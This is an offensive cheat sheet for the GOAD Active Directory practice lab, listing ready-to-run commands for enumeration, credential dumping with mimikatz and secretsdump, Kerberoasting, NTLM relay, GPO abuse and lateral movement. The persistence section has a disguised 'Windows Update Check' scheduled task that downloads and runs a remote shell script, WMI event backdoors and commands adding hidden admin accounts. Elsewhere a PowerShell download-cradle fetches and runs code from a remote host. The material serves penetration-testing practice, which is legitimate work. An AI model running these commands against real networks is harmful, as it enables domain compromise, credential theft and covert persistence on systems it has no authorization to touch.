# GOAD Lab Tools Cheat Sheet

## Recon Tools

### Bloodhound

**Installation & Setup**
```bash
# Download & import data
bloodhound-python -u username -p password -d domain.local -dc domain-controller -c all
# Or with SharpHound on target
Import-Module .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain domain.local
```

**Top Cypher Queries**
```cypher
# Find Kerberoastable Users
MATCH (n:User) WHERE n.hasspn=true RETURN n

# Find ASREPRoastable Users  
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u

# Find Domain Admins
MATCH (n:User)-[:MemberOf*1..]->(g:Group) WHERE g.name CONTAINS 'DOMAIN ADMINS' RETURN n.name

# Find shortest path to Domain Admin
MATCH (u:User),(g:Group {name:"DOMAIN ADMINS@SEVENKINGDOMS.LOCAL"}) 
MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p

# Find users with DCSync rights
MATCH (n1)-[:MemberOf|GetChanges*1..]->(u) WHERE u.objectid ENDS WITH '-512' RETURN n1

# Find computers with unconstrained delegation
MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c

# Find High Value Targets
MATCH (u:User) WHERE u.highvalue=true RETURN u
```

### PowerView

**Domain Enumeration**
```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('http://ip:port/PowerView.ps1')

# Get domain info
Get-NetDomain
Get-NetDomainController
Get-NetForest

# User enumeration  
Get-NetUser
Get-NetUser -SPN  # Kerberoastable users
Get-NetUser -PreauthNotRequired  # ASREPRoastable users
Get-UserProperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "pass"

# Group enumeration
Get-NetGroup
Get-NetGroup -Domain essos.local
Get-NetGroupMember "Domain Admins"
Get-NetLocalGroup -ComputerName winterfell

# Computer enumeration
Get-NetComputer
Get-NetComputer -OperatingSystem "Windows Server 2019"
Get-NetComputer -Ping

# GPO enumeration
Get-NetGPO
Get-NetGPO -ComputerName castelblack
Find-GPOLocation -UserName jon.snow

# Trust enumeration
Get-NetDomainTrust
Get-NetForestTrust
```

**User Hunting**
```powershell
# Find local admin access
Find-LocalAdminAccess
Test-AdminAccess -ComputerName winterfell

# Hunt for users
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Stealth

# Session enumeration
Get-NetSession -ComputerName kingslanding
Get-NetLoggedon -ComputerName winterfell
```

### SharpHound

```powershell
# Basic collection
.\SharpHound.exe --CollectionMethods All --Domain sevenkingdoms.local

# Stealth collection
.\SharpHound.exe --CollectionMethods Group,LocalAdmin,Session --Stealth

# Specific domain
.\SharpHound.exe --CollectionMethods All --Domain essos.local --DomainController meereen.essos.local
```

### Adalanche

```bash
# Analyze LDAP dump
adalanche analyze -d /path/to/ldap/dump

# Generate HTML report
adalanche analyze -d /path/to/ldap/dump --html-output /output/dir
```

### CrackMapExec

**Target Discovery**
```bash
# Network scan
crackmapexec smb 192.168.56.0/24
crackmapexec winrm 192.168.56.0/24

# Null sessions
crackmapexec smb 192.168.56.0/24 -u '' -p ''
```

**Authentication**
```bash
# Password auth
crackmapexec smb winterfell -u jon.snow -p password
crackmapexec smb 192.168.56.0/24 -u users.txt -p passwords.txt --continue-on-success

# Hash auth (Pass-the-Hash)
crackmapexec smb winterfell -u jon.snow -H aad3b435b51404eeaad3b435b51404ee:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918

# Kerberos auth
export KRB5CCNAME=ticket.ccache
crackmapexec smb winterfell -k --no-pass
```

**Enumeration**
```bash
# Enumerate users & groups
crackmapexec smb winterfell -u jon.snow -p password --users
crackmapexec smb winterfell -u jon.snow -p password --groups
crackmapexec smb winterfell -u jon.snow -p password --local-users

# Enumerate shares
crackmapexec smb winterfell -u jon.snow -p password --shares

# Enumerate sessions
crackmapexec smb winterfell -u jon.snow -p password --sessions

# Check admin access
crackmapexec smb 192.168.56.0/24 -u jon.snow -p password --local-auth

# RID Bruteforce
crackmapexec smb winterfell -u jon.snow -p password --rid-brute
```

---

## Exploitation Tools

### Mimikatz

**Basic Commands**
```
# Enable debug privileges
privilege::debug
token::elevate

# Dump credentials
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::tspkg
sekurlsa::ekeys

# Dump SAM/LSA
lsadump::sam
lsadump::secrets
lsadump::cache
```

**Kerberos Attacks**
```
# List tickets
sekurlsa::tickets

# Dump tickets
sekurlsa::tickets /export

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Golden Ticket
kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Silver Ticket
kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-... /target:castelblack.north.sevenkingdoms.local /service:cifs /rc4:hash /ptt
```

**DCSync Attack**
```
# Dump single user
lsadump::dcsync /user:krbtgt
lsadump::dcsync /user:sevenkingdoms\administrator

# Dump all users
lsadump::dcsync /domain:sevenkingdoms.local /all
```

### Rubeus

**Kerberoasting**
```
# List Kerberoastable users
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:"admincount=1"

# Request TGS tickets
.\Rubeus.exe kerberoast /user:jon.snow
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

**ASREPRoasting**
```
# Check for ASREPRoastable users
.\Rubeus.exe asreproast
.\Rubeus.exe asreproast /user:brandon.stark
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

**Pass-the-Ticket**
```
# Extract tickets
.\Rubeus.exe dump
.\Rubeus.exe triage

# Use ticket
.\Rubeus.exe ptt /ticket:base64ticket

# Renew ticket
.\Rubeus.exe renew /ticket:base64ticket
```

**Unconstrained Delegation**
```
# Monitor for TGTs
.\Rubeus.exe monitor /interval:5
.\Rubeus.exe harvest /interval:30
```

### Responder

**LLMNR/NBT-NS Poisoning**
```bash
# Basic poisoning
responder -I eth0 -rdw

# Analyze mode (passive)
responder -I eth0 -A

# Disable SMB & HTTP servers (for relay)
responder -I eth0 -rdw --disable-ess
```

**With NTLM Relay**
```bash
# Setup relay targets
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (dump domain info)
ntlmrelayx.py -t ldap://kingslanding.sevenkingdoms.local -smb2support --dump-all

# Relay with execute commands
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

### GPP-Decrypt

```bash
# Decrypt Group Policy Preferences passwords
gpp-decrypt "encrypted_password_from_xml"

# Search for GPP files
findstr /S cpassword \\domain.local\sysvol\domain.local\Policies\*.xml
```

### SharpGPOAbuse

**Add Local Admin via GPO**
```
# Add user to local administrators
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "SEVENKINGDOMS\tyrion.lannister" --GPOName "STARKWALLPAPER"

# Add computer startup script
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net user backdoor Password123 /add && net localgroup administrators backdoor /add" --GPOName "STARKWALLPAPER"

# Add immediate task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author "SEVENKINGDOMS\Administrator" --Command "cmd.exe" --Arguments "/c net user debug Password123 /add" --GPOName "STARKWALLPAPER"
```

### Empire

**Setup & Agents**
```bash
# Start Empire server
sudo powershell-empire server

# Start client
powershell-empire client

# Create listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.56.101:8080
(Empire: listeners/http) > execute

# Generate stager
(Empire) > stagers
(Empire: stagers) > usestager windows/launcher_bat
(Empire: stagers/windows/launcher_bat) > set Listener http
(Empire: stagers/windows/launcher_bat) > generate
```

**Post-Exploitation Modules**
```bash
# Credential harvesting
(Empire: agents) > usemodule credentials/mimikatz/logonpasswords
(Empire: agents) > usemodule credentials/powerdump

# Situational awareness  
(Empire: agents) > usemodule situational_awareness/network/powerview/get_domain_controller
(Empire: agents) > usemodule situational_awareness/network/bloodhound

# Privilege escalation
(Empire: agents) > usemodule privesc/ask
(Empire: agents) > usemodule privesc/bypassuac_eventvwr
```

### Impacket

**secretsdump.py**
```bash
# Dump domain hashes via DCSync
secretsdump.py sevenkingdoms/cersei.lannister:password@kingslanding.sevenkingdoms.local

# Dump with NTLM hash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:hash sevenkingdoms/cersei.lannister@kingslanding.sevenkingdoms.local

# Dump local SAM/LSA
secretsdump.py administrator:password@192.168.56.10 -outputfile dumped_hashes
```

**wmiexec.py**
```bash
# Execute commands via WMI
wmiexec.py sevenkingdoms/cersei.lannister:password@winterfell.north.sevenkingdoms.local
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash sevenkingdoms/administrator@castelblack

# Execute single command
wmiexec.py sevenkingdoms/administrator:password@castelblack "whoami"
```

**mssqlclient.py**
```bash
# Connect to MSSQL server
mssqlclient.py sevenkingdoms/jon.snow:password@castelblack -windows-auth

# Enable xp_cmdshell
SQL> enable_xp_cmdshell

# Execute OS commands
SQL> xp_cmdshell whoami

# Query linked servers
SQL> SELECT * FROM sys.servers
SQL> EXEC ('SELECT @@version') AT [BRAAVOS]
```

---

## Persistence

### Mimikatz Golden/Silver Tickets
```
# Golden Ticket (requires krbtgt hash)
kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Silver Ticket (requires service hash)  
kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-... /target:castelblack /service:cifs /rc4:hash /ptt
```

### Rubeus Ticket Management
```
# Create renewable ticket
.\Rubeus.exe asktgt /user:Administrator /rc4:hash /renewmax:10080 /ptt

# Harvest TGTs periodically
.\Rubeus.exe harvest /interval:30
```

### Scheduled Tasks
```powershell
# Create scheduled task for persistence
schtasks /create /tn "Windows Update Check" /tr "powershell -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/shell.ps1')" /sc onlogon /ru system

# Via PowerShell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -c backdoor_command"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "WindowsUpdate" -Description "System Update Task"
```

### WMI Event Persistence
```powershell
# Create WMI event filter
$EventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Updater";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200"}

# Create WMI consumer  
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="Updater";ExecutablePath="C:\Windows\System32\cmd.exe";CommandLineTemplate="/c powershell.exe -ep bypass backdoor"}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$EventFilter;Consumer=$Consumer}
```

---

## Lateral Movement

### PsExec
```bash
# Impacket psexec
psexec.py sevenkingdoms/administrator:password@winterfell

# With hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash sevenkingdoms/administrator@castelblack

# Native Windows psexec
psexec \\winterfell -u sevenkingdoms\administrator -p password cmd
```

### PowerShell Remoting
```powershell
# Enable PSRemoting (if admin)
Enable-PSRemoting -Force

# Connect to remote host
Enter-PSSession -ComputerName winterfell -Credential (Get-Credential)

# Execute commands remotely
Invoke-Command -ComputerName winterfell -ScriptBlock {whoami}

# Pass-the-Hash with PSRemoting
$password = ConvertTo-SecureString -AsPlainText -Force "aad3b435b51404eeaad3b435b51404ee:hash"
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $password)
Invoke-Command -ComputerName winterfell -Credential $cred -ScriptBlock {whoami}
```

### WinRM
```bash
# Evil-WinRM with password
evil-winrm -i winterfell -u administrator -p password

# With NTLM hash
evil-winrm -i winterfell -u administrator -H hash

# Upload/Download files
*Evil-WinRM* PS> upload /local/path/file.exe C:\Windows\Temp\
*Evil-WinRM* PS> download C:\Windows\Temp\file.exe /local/path/
```

### SMB
```bash
# Mount SMB share
smbclient //winterfell/c$ -U sevenkingdoms\\administrator

# Copy files via SMB
smbclient //winterfell/admin$ -U administrator -c "put shell.exe"

# Use CrackMapExec for lateral movement
crackmapexec smb 192.168.56.0/24 -u administrator -H hash -x "whoami"
```

### MSSQL Trusted Links
```sql
-- From castelblack to braavos (GOAD specific)
-- List linked servers
SELECT * FROM sys.servers;

-- Execute commands on linked server
EXEC ('xp_cmdshell ''whoami''') AT [BRAAVOS];

-- Enable xp_cmdshell on remote server
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [BRAAVOS];
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [BRAAVOS];

-- Chain through multiple servers
EXEC ('EXEC (''SELECT @@version'') AT [ANOTHER_SERVER]') AT [BRAAVOS];
```

---

## GOAD Specific Attack Paths

### Domain: north.sevenkingdoms.local
- **Target**: jon.snow (Kerberoasting, MSSQL admin)
- **Target**: brandon.stark (ASREPRoasting) 
- **Target**: sansa.stark (Unconstrained delegation)
- **Attack**: MSSQL link castelblack -> braavos via jon.snow

### Domain: sevenkingdoms.local  
- **Target**: tywin.lannister (Password in SYSVOL)
- **Target**: lord.varys (GenericAll on Domain Admins)
- **Attack**: GPO abuse via STARKWALLPAPER GPO

### Domain: essos.local
- **Target**: missande (ASREPRoasting, GenericAll on khal)
- **Target**: khal.drogo (Shadow credentials on viserys)
- **Attack**: LAPS password reading via jorah.mormont

### Cross-Domain Attacks
- **AcrossTheSea** group (cross-forest)  
- **DragonsFriends** group (cross-forest)
- **AccorsTheNarrowSea** group (trust abuse)

---

*Remember: Always obtain proper authorization before using these tools and techniques in any environment.*